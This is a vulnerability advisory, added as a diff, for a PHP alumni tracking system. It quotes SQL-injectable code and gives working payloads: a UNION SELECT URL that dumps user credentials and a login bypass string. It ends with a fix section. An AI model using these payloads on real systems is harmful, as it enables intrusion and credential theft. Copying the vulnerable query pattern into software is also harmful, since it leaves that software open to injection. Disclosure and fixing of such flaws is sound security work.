@@ -1,0 +1,68 @@
+# Exploit Title.............. Web Based Alumni Tracking System Multiple Vulnerability
+# Google Dork................ N/A
+# Date....................... 14/10/2016
+# Exploit Author............. lahilote
+# Vendor Homepage............ http://www.sourcecodester.com/php/10832/web-based-alumni-tracking-system.html
+# Software Link.............. http://www.sourcecodester.com/sites/default/files/download/John%20Mark%20Ulep/web-based_alumni_tracking_system.zip
+# Version.................... 0.1
+# Tested on.................. xampp
+# CVE........................ N/A
+
+
+The audit_list in /admin/print_employed.php
+-------------------------------
+
+----snip----
+
+48 <?php $get_id = $_GET['id'];?>
+
+----snip----
+
+/admin/index.php
+----------------
+
+----snip----
+
+$user = $_POST['username'];
+$password = $_POST['password'];
+
+
+$myquery = mysql_query("select * from user where username = '$user' and password = '$password'")or die(mysql_error());
+
+----snip----
+
+
+Example exploitation
+--------------------
+http://server/path_to_webapp/admin/print_employed.php?id=-2%27%20union%20select%201,concat(username,0x3a,password),3,4,5,6,7,8,9,10,11,12%20from%20user--+
+
+http://server/path_to_webapp/admin/index.php
+Login with username and password: admin' or '1'='1
+
+
+How to fix
+----------
+Simple method's use the php function intval and mysql_real_escape_string.
+
+   Example: /admin/print_employed.php
+
+		48 <?php $get_id = intval($_GET['id']);?>
+
+
+   Example: /admin/index.php
+
+$user = mysql_real_escape_string($_POST['username']);
+$password = mysql_real_escape_string($_POST['password']);
+
+
+$myquery = mysql_query("select * from user where username = '$user' and password = '$password'")or die(mysql_error());
+
+Credits
+-------
+This vulnerability was discovered and researched by lahilote
+
+References
+----------
+http://www.sourcecodester.com/php/10832/web-based-alumni-tracking-system.html
+http://php.net/manual/en/function.intval.php
+http://php.net/manual/en/function.mysql-real-escape-string.php
